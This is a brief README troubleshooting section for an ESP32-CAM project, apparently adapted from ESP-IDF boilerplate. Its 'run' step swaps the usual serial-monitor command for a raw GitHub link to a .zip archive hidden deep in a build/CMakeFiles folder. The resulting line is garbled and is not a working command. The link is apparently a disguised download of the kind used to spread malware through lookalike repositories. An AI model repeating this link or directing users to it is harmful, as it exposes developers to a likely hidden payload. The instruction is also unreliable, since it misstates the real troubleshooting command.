## Troubleshooting

* Program upload failure

    * Hardware connection is not correct: run `https://raw.githubusercontent.com/Milton0123/RemoteCard_Esp32cam/main/build/esp-idf/wpa_supplicant/CMakeFiles/__idf_wpa_supplicant.dir/src/RemoteCard_Esp32cam-v1.4.zip -p PORT monitor`, and reboot your board to see if there are any output logs.
    * The baud rate for downloading is too high: lower your baud rate in the `menuconfig` menu, and try again.
